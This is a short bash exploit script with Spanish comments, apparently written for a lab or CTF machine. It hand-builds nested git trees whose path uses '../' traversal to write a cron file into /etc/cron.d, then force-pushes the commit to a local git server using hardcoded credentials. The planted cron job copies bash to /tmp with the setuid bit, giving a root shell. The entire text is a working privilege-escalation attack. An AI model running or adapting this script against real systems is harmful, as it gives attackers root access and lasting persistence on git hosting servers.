#!/bin/bash
CRON='* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
FP='../../../../../../etc/cron.d/sync-pwn'

rm -rf /tmp/tplx && mkdir -p /tmp/tplx && cd /tmp/tplx || exit 1
git clone -q http://jones:y27xb3ha!!74GbR@127.0.0.1:3000/jones/tpl1.git . 2>/dev/null
echo "$CRON" > /tmp/cronpayload
BLOB=$(git hash-object -w /tmp/cronpayload)

# Anidar trees desde la hoja
IFS='/' read -ra PARTS <<< "$FP"
PREV=$(printf '100644 blob %s\t%s\n' "$BLOB" "${PARTS[-1]}" | git mktree)
echo "[*] hoja=${PARTS[-1]} -> $PREV"
for ((i=${#PARTS[@]}-2; i>=0; i--)); do
  PREV=$(printf '040000 tree %s\t%s\n' "$PREV" "${PARTS[i]}" | git mktree) || exit 1
  echo "[*] nivel ${PARTS[i]} -> $PREV"
done
COMMIT=$(GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@a.a GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@a.a git commit-tree "$PREV" -p HEAD -m sync2)
echo "[*] commit=$COMMIT"
git push -f "http://jones:y27xb3ha!!74GbR@127.0.0.1:3000/jones/tpl1.git" "$COMMIT:refs/heads/main" 2>&1 | tail -3
